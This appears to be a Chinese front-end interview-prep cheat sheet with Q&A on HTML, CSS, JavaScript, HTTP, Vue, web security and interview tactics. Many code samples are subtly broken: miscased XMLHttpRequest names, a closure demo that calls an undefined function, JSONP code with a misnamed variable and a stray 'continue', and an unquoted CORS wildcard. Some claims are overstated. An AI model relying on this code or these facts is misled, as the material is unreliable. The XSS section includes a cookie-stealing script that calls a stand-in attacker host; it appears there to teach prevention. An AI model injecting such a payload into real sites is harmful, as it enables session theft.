十四 面试题 html

1.	（必考） 你是如何理解 HTML 语义化的？
    <pre>
    第一种:
    举例，段落用 p，边栏用 aside，主要内容用 main 标签
    第二种:
    最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。
    后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。
    再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签
    语义化的好处是已读、有利于SEO等。
    参考 https://zhuanlan.zhihu.com/p/32570423
    </pre>

2.	meta viewport 是做什么用的，怎么写？
    ```html
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    // 控制页面在移动端不要缩小显示
    ```
    <pre>
    一开始，所有页面都是给PC准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。
    后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。
    </pre>

3.	canvas 元素是干什么的？

十五 面试题 css

1.	（必考） 说说盒模型。
	<pre>
    举例：
    box-sizing: content-box: width == 内容区宽度
    box-sizing: border-box: width == 内容区宽度 + padding 宽度 + border 宽度
    </pre>

2.	css reset 和 normalize.css 有什么区别？
    <pre>
    reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式
    normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。
    </pre>

3.	（必考）如何居中？
    <pre>
    水平居中：
    内联：爸爸身上写 text-align:center;
    块级：margin-left: auto; margin-right: auto;

    垂直居中： https://jscode.me/t/topic/1936
    如果 parent 的 height 不写，你只需要 padding: 10px 0; 
    就能将 child 垂直居中；
    如果 parent 的 height 写死了，就很难把 .child 居中，以下是垂直居中的方法。
    （忠告：能不写 height 就千万别写 height。）
    table自带功能
    100% 高度的 afrer before 加上 inline-block
    div 装成 table
    margin-top -50%
    translate -50%
    opsition: absolute; margin auto
    display: flex
    </pre>

4.	选择器优先级如何确定？
    <pre>
    选择器越具体，优先级越高。 #xxx 大于 .yyy
    同样优先级，写在后面的覆盖前面的。
	color: red !important; 优先级最高。
    </pre>

5.	BFC 是什么？
    <pre>
    overflow:hidden 清除浮动。（推荐用 .clearfix 清除浮动）
    overflow:hidden 取消父子 margin 合并。（推荐用 padding-top: 0.1px;）
    </pre>

6.	如何清除浮动？
    <pre>
    overflow: hidden （不推荐）
    .clearfix 清除浮动写在爸爸身上
    </pre>
    ```css
    .clearfix::after{
	    content: ''; display: block; clear:both;
    }
    ```

十六 面试题 js

1.	JS 有哪些数据类型？
    string number bool undefined null object symbol
    object 包括了数组、函数、正则、日期等对象
    一旦出现（数组、函数、正则、日期、NaN）直接0分

2.	（必考） Promise 怎么使用？
    <pre>
    then
    $.ajax(...).then(成功函数, 失败函数)
	
    链式 then
    $.ajax(...).then(成功函数, 失败函数).then(成功函数2, 失败函数2)
    
    如何自己生成 Promise 对象
    </pre>
    ```javascript
        function xxx(){
            return new Promise(function(resolve, reject){
                setTimeout(()=>{
                    resolve() 或者 reject()
                },3000)
            })
        }
        xxx().then(...)
    ```

3.	（必考） AJAX 手写一下？
    ```javascript
        let xhr = new XmlHttpRequest()
        xhr.open('POST','/xxx')
        xhr.onreadystatechange = ()=>{
            if(xhr.readystate === 4 && xhr.status === 200){
                 console.log(xhr.responseText)      
            }
        }
        xhr.send('a=1&b=2')
    ```

4.	（必考）闭包是什么？
    ```javascript
    function Addition (){
        var n = 0
        return function(){
            n += 1
        }
    }
    let  addition = Addition()
    adder() // n === 1
    adder() // n === 2
    console.log(n) // n is undefined
    ```
    正确参考：https://zhuanlan.zhihu.com/p/22486908

5.  （必考）这段代码里的 this 是什么？
    <pre>
    function() 里面的 this 就是 window
    function() 是 strict mode，this 就是 undefined
    a.b.c.function() 里面的 this 就是 a.b.c
    new Function() 里面的 this 就是新生成的实例
    () => console.log(this) 里面 this 跟外面的 this 的值一模一样
    
    正确参考：https://zhuanlan.zhihu.com/p/23804247
    使用function定义的函数，this的指向随着调用环境的变化而变化的，
    而箭头函数中的this指向是固定不变的，一直指向的是定义函数的环境。
    </pre>

6.  必考）什么是立即执行函数？使用立即执行函数的目的是什么？
    ```javascript
    ;(function(){
        var xx
    }())
    ;(function(){
        var xx
    })()
    !function(){
        var xx
    }()
    ~function(){
        var xx
    }()
    ```
    造出一个函数作用域，防止污染全局变量
    ```javascript
    {
        let  name
    }

    ```

7.	async/await 语法了解吗？目的是什么？
    ```javascript
    function resolveAfter2Seconds() {
        return new Promise(resolve => {
            setTimeout(() => {
                resolve('resolved')
            }, 2000)
        })
    }
    async function asyncCall() {
        console.log('calling')
        const result = await resolveAfter2Seconds()
        console.log(result)
        // expected output: 'resolved'
    }
    asyncCall();
    ```
    把异步代码写成同步代码。

8.  如何实现深拷贝？
    <pre>
    JSON 深拷贝
    缺点：JSON 不支持函数、引用、undefined、RegExp、Date……
    </pre>
    ```javascript
    let a = {...}
    let b = JSON.parse(JSON.stringify(a))
    ```
    <pre>
    递归拷贝
    </pre>
    ```javascript
    function copy(obj){
        let newobj = null;      //声明一个变量用来储存拷贝之后的内容

        if(typeof(obj) === 'object' && obj !== null){
            //判断数据类型是否是复杂类型，如果是则调用自己，再次循环，如果不是，直接赋值即可，
            //由于null不可以循环但类型又是object，所以这个需要对null进行判断
        
            newobj = obj instanceof Array? [] : {};   
            //声明一个变量用以储存拷贝出来的值,根据参数的具体数据类型声明不同的类型来储存
            
	        //循环obj 中的每一项，如果里面还有复杂数据类型，则直接利用递归再次调用copy函数
            for(var i in obj){  
                newobj[i] = copy(obj[i])
            }
        }else{
            newobj = obj
        }    
        
        return newobj;    //函数必须有返回值，否则结构为undefined
   }

    ```

9.  如何实现数组去重？
    计数排序的逻辑（只能正整数）
    ```javascript
    let a = [4,2,5,6,3,4,5]
    let hash = [] //{}
    for(let i=0;i<a.length;i++){
        if(a[i] in hash){
            continue
        }else{
            hash.push(a[i])
            //hash[ a[i] ] = ture
        }
    }
    //hash: {4: true, 2: true, 5: true, 6:true, 3: true}
    //console.log(Object.keys(hash))

    let mySet = new Set([1,5,2,3,4,2,3,1,3,4])
    function unique3() {
    let a = []
    mySet.forEach((x)=>{a.push(x)}) 
    return a
    }

    ```
    Set去重
    ```javascript
    Array.from(new Set(a))
    ```

10.	如何用正则实现 string.trim() ？
    ```javascript
    function trim(string){
        return string.replace(/^\s+|\s+$/g, '')
    }
    ```
    在线练习地址：https://regex101.com/


11. js原型是什么
    <pre>
    var a = [1,2,3]
    a 只有0、1、2、length 4 个key
    为什么可以 a.push(4) ，push 是哪来的？
    a.__proto__ === Array.prototype
    push 就是沿着 a.__proto__ 找到的，也就是 Array.prototype.push
    Array.prototype 还有很多方法，如 join、pop、slice、splice
    Array.prototype 就是 a 的原型（proto）

    参考：https://zhuanlan.zhihu.com/p/23090041
    </pre>

12.	ES 6 中的 class 了解吗？
    ```javascript
    class Rectangle {
        // constructor
        constructor(height, width) {
            this.height = height;
            this.width = width;
        }
        // Getter
        get area() {
            return this.calcArea()
        }
        // Method
        calcArea() {
            return this.height * this.width;
        }
    }
    const square = new Rectangle(10, 10);

    console.log(square.area); // 100
    ```

13.	JS 如何实现继承？
    原型链
    ```javascript
    function Animal(){
        this.body = '重量'
    }
    Animal.prototype.move = function(){ }

    function Human(name){
        Animal.apply(this,arguments)
        // apply:方法能劫持另外一个对象的方法，继承另外一个对象的属性.
        this.name = name
    }

    // Human.prototype.__proto__ = Animal.prototype // 非法
    var fn = function(){}
    fn.prototype = Animal.prototype
    Human.prototype = new fn()

    Human.prototype.useTools = function(){}
    var xiaoming = new Human() //apply里的this就是xioaming,
    ```
    extends关键字
    ```javascript
    class Animal{
        constructor(){
            this.body = '重量'
        }
        move(){}
    }

    class Human extends Animal{
        constructor(name){
            super()
            this.name = name
        }
        useTools(){}
    }

    var xiaoming = new Human()
    ```

十七 DOM面试题

1.  DOM事件模型是什么？
    <pre>
    捕获
    冒泡
    如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的。
    </pre>

2. 	移动端的触摸事件了解吗？
    <pre>
    touchstart touchmove touchend touchcancel
    模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。
    </pre>

3. 	事件委托是什么？有什么好处？
    <pre>
    假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，
    看触发事件的元素是哪个儿子，这就是事件委托。
    
    可以监听还没有出生的儿子（动态生成的元素）。省监听器。
    </pre>
    ```javascript
    function listen(element,eventType,selector,fn){
        element.addEventListener(eventType,e=>{
            if(e.target.matches(selector)){
                fn.call(el,e,el)
            }
        })
    }

    function listen(element, eventType, selector, fn) {
        element.addEventListener(eventType, e => {
	        let el = e.target
	        while (!el.matches(selector)) {
	            if (element === el) {
	                el = null
	                break
	            }
	            el = el.parentNode
	        }
	        el && fn.call(el, e, el)
	    })
	    return element
	}
    ```

十八 HTTP面试题

1.  HTTP 状态码知道哪些？
    <pre>
    2** 开头，（请求成功）表示成功处理了请求的状态码
    3** 开头，（请求被重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向
    4** 开头，（请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理
    5** 开头，（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。
    </pre>

2.	301 和 302 的区别是什么？
    <pre>
    301 永久重定向，浏览器会记住
    302 临时重定向
    </pre>

3.	HTTP 缓存怎么做？
    <pre>
    Cache-Control: max-age=300
    http://cdn.com/1.js?v=1 避开缓存(更新)
    </pre>

4.	Cache-Control 和 Etag 的区别是什么？
    Cache-Control直接是通过不请求来实现，而ETag是会发请求的，只不过服务器根据请求的东西的内容有无变化来判断是否返回请求的资源

5.	Cookie 是什么？Session 是什么？
    <pre>
    Cookie
    HTTP响应通过 Set-Cookie 设置 Cookie
    浏览器访问指定域名是必须带上 Cookie 作为 Request Header
    Cookie 一般用来记录用户信息
    
    Session
    Session 是服务器端的内存（数据）
    Session 一般通过在 Cookie 里记录 SessionID 实现
    SessionID 一般是随机数
    </pre>

6.	LocalStorage 和 Cookie 的区别是什么？
    <pre>
    Cookie 会随请求被发到服务器上，而 LocalStorage 不会
    Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右
    </pre>

7.	（必考）GET 和 POST 的区别是什么？
    <pre>
    参数
    GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里
    
    安全（扯淡）
    GET 没有 POST 安全（都不安全）
    
    GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）
    
    包
    GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）
    
    GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）
    </pre>

8.	（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？
    JSONP
     ```javascript
    //前端
        let script = document.createElement('script')
        let functionName = 'ygzs'+ parseInt(Math.random()*10000000 ,10)
        window[functionName] = function(resule){  // 每次请求之前搞出一个随机的函数
            if(result === 'success'){
                alert('success')
            }else{
                continue
            }
        }
        script.src = 'https://xxx.com?callback=' + functionName
        document.body.appendChild(script)
        script.onload = function(e){ // 状态码是 200~299 则表示成功
            e.currentTarget.remove()
            delete window[functionName] // 请求完了就干掉这个随机函数
        }
        script.onerror = function(e){ // 状态码大于等于 400 则表示失败
            e.currentTarget.remove()
            delete window[functionName] // 请求完了就干掉这个随机函数
        }
    //后端
    ...
    if (path === '/xxx'){
        response.setHeader('Content-Type', 'application/javascript')
        response.statusCode = 200
        response.write(`
            ${query.callback}.call(undefined, 'success')
        `)
        response.end()
    }
    ...

    ```
    CORS
    ```javascript
    //后端
        response.setHeader('Access-Control-Allow-Origin', *)
    ```
    postMessage
    <pre>
    用法：postMessage(data,origin)方法接受两个参数
    
    data： html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。
    
    origin： 协议+主机+端口号，也可以设置为"*"，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为"/"。
    </pre>

十九 vue面试题

1.	（必考）Vue 有哪些生命周期钩子函数？
    <table>
    <tr>
    <th>钩子函数</th>
    <th>触发的行为</th>
    <th>在此阶段可以做的事情</th>
    </tr>

    <tr><td>beforeCreadted</td>
    <td>vue实例的挂载元素$el和数据对象data都为undefined,还未初始化</td>
    <td>加loading事件</td></tr>

    <tr><td>created</td>
    <td>vue实例的数据对象data有了,el还没有</td>
    <td>结束loading,请求数据为mounted渲染做准备</td></tr>

    <tr><td>beforeMount</td>
    <td>$el和data都初始化了,但还是虚拟的dom节点,具体的data.filter还未替换</td>
    <td></td></tr>

    <tr><td>mounted</td>
    <td>vue实例挂载完成,data.filter成功渲染</td>
    <td>配合路由钩子使用</td></tr>

    <tr><td>beforeUpdate</td>
    <td>data更新时触发</td>
    <td></td></tr>

    <tr><td>updated</td>
    <td>data更新时触发</td>
    <td>数据更新时,做一些处理(此处也可以用watch进行观测)</td></tr>

    <tr><td>beforeDestroy</td>
    <td>组件销毁时触发</td>
    <td></td></tr>

    <tr><td>destroyed</td>
    <td>组件销毁时触发,vue实例解除了事件监听以及和dom的绑定,但DOM节点依旧存在</td>
    <td>组件销毁时进行提示</td></tr>
    </table>

2. （必考）Vue 如何实现组件通信？
    props/$emit
    <pre>
    父组件向子组件传递数据是通过prop传递的，子组件传递数据给父组件是通过$emit触发事件来做到的。

    1.父组件传递了message数据给子组件，并且通过v-on绑定了一个getChildData事件来监听子组件的触发事件；
    2.子组件通过props得到相关的message数据,最后通过this.$emit触发了getChildData事件。
    </pre>
    
    $emit/$on
    <pre>
    这种方法通过一个空的 Vue 实例作为中央事件总线（事件中心），用它来触发事件和监听事件,巧妙而轻量地实现了任何组件间的通信，包括父子、兄弟、跨级。当我们的项目比较大时，可以选择更好的状态管理解决方案 vuex。
    </pre>
    ```javascript
        var Event=new Vue();
        Event.$emit(事件名,数据);
        Event.$on(事件名,data => {});
    ```

    $attrs/$listeners
    <pre>
    如果父组件A下面有子组件B，组件B下面有组件C,这时如果组件A想传递数据给组件C,可以使用这种方法（多级组件）
    </pre>

    provide/inject
    <pre>
    父组件中通过provider来提供变量，然后在子组件中通过inject来注入变量。不论子组件有多深，只要调用了inject那么就可以注入provider中的数据。而不是局限于只能从当前父组件的prop属性来获取数据，只要在父组件的生命周期内，子组件都可以调用。
    </pre>

    Vuex                                                                 <br>

    <pre>
    常见使用场景可以分为三类：

    父子通信：
    父向子传递数据是通过 props,子向父是通过 events($emit)
    通过父链 / 子链也可以通信($parent / $children),ref 也可以访问组件实例provide / inject 
    API:$attrs / $listeners
    
    兄弟通信：
    Bus,Vuex
    
    跨级通信：
    Bus；Vuex
    provide / inject 
    API:$attrs / $listeners
    </pre>

3.  Vuex 的作用是什么?
    Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。

4.  VueRouter 路由是什么？
    <pre>
    这里的路由就是SPA（单页应用）的路径管理器

    vue-router是Vue.js官方的路由插件，它和vue.js是深度集成的，适合用于构建单页面应用。vue的单页面应用是基于路由和组件的，路由用于设定访问路径，并将路径和组件映射起来。传统的页面应用，是用一些超链接来实现页面切换和跳转的。在vue-router单页面应用中，则是路径之间的切换，也就是组件的切换。路由模块的本质 就是建立起url和页面之间的映射关系。
    </pre>

5.  Vue 的双向绑定是如何实现的？有什么缺点？
    <pre>
    当你把一个普通的 JavaScript 对象传入 Vue 实例作为 data 选项，Vue 将遍历此对象所有的 property，并使用 Object.defineProperty 把这些 property 全部转为 getter/setter。
    </pre>
    <pre>
    由于 JavaScript 的限制，Vue 不能检测数组和对象的变化。

    对于对象
    Vue 无法检测 property 的添加或移除。由于 Vue 会在初始化实例时对 property 执行 getter/setter 转化，所以 property 必须在 data 对象上存在才能让 Vue 将它转换为响应式的
    Vue.set(object, propertyName, value)
    </pre>
    <pre>
    对于数组

    Vue 不能检测以下数组的变动：
    当你利用索引直接设置一个数组项时，例如：vm.items[indexOfItem] = newValue
    当你修改数组的长度时，例如：vm.items.length = newLength

    为了解决第一类问题：
    Vue.set(vm.items, indexOfItem, newValue)
    为了解决第二类问题，你可以使用 splice：
    vm.items.splice(newLength)
    </pre>

6.  computed 计算属性的用法？跟 methods 的区别。
    <pre>
    computed是响应式的，methods并非响应式。
    · 调用方式不一样，computed定义的成员像属性一样访问，methods定义的成员必须以函数形式调用。
    · computed是带缓存的，只有其引用的响应式属性发生改变时才会重新计算，而methods里的函数在每次调用时都要执行。
    · computed中的成员可以只定义一个函数作为只读属性，也可以定义get/set变成可读写属性，这点是methods中的成员做不到的
    </pre>

二十 算法面试题

1.	排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
2.	二分查找法
3.	翻转二叉树

二十二 关于安全面试题

1.	什么是 XSS 攻击？如何预防？
    ```javascript
    div.innerHTML = userComment  
    // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
    // 恶意就被执行了，这就是 XSS
    ```
    <pre>
    预防

    不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行

    如果你一样要用 innerHTML，字符过滤
    •	把 < 替换成 &lt;
    •	把 > 替换成 &gt;
    •	把 & 替换成 &amp;
    •	把 ' 替换成 &#39;
    •	把 ' 替换成 &quot;
    •	代码 div.innerHTML = userComment.replace(/>/g, '&gt;').replace...

    使用CSP
    Content-Security-Policy: policy
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
    </pre>

2.  什么是 CSRF 攻击？如何预防？
    <pre>
    CSRF攻击涉及用户受害者、受信任的网站和恶意网站。当受害者与受信任的站点拥有一个活跃的会话的同时，如果访问恶意网站，恶意网站会注入一个HTTP请求到受信任的站点，从而破话用户的信息。
    
    添加校验token
    检查Referer字段
    </pre>

二十三 webpack面试题

1.	转译出的文件过大怎么办？
    <pre>
	使用 code split
	写法 import('xxx').then(xxx=>{console.log(xxx)})
    </pre>

二十四 发散题

1.	从输入 URL 到页面展现中间发生了什么？
    <pre>
    	DNS 查询 
    	建立 TCP 连接（三次握手）
    	发送 HTTP 请求（请求的四部分）
    	后台处理请求
    	    监听 80 端口
    	    路由
    	    渲染 HTML 模板
    	    生成响应
    	发送 HTTP 响应
    	关闭 TCP 连接（四次挥手）
    	解析 HTML
    	下载 CSS js 图片 等
    	解析 CSS js 图片 等
    	渲染 DOM 树
    	渲染样式树
    	执行 JS
    </pre>
2.	你没有工作经历吗？
    凭我的作品，我觉得我可以胜任贵司的工作。
3.	你遇到过最难的问题是什么？
    参考：https://www.zhihu.com/question/35323603/answer/338796153
4.	你的期望薪资是多少？
    你想要的工资 加 1000~2000。
5.	（任何你不会的问题）
    <pre>
        承认不会
        问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？
        根据面试官的回答，向有利于自己的方向引导话题。
    </pre>

二十五 代码题

1.	map加parseInt
    ```javascript
    [1,2,3].map(parseInt)
	
	parseInt(1,0, array) // 1
	parseInt(2,1, array) // NaN
	parseInt(3,2, array) // NaN

    ```
2.  
    ```javascript
    var a = {n:1}
	var b = a
	a.x = a = {n:2}

    //a.x 是 undefined
    ```
3.	(a ==1 && a== 2 && a==3) 可能为 true 吗？
    ```javascript
    a = {
	  value: 0,
	  toString(){
	    a.value += 1
	    return a.value 
	  }
    }

    // 可以
    ```
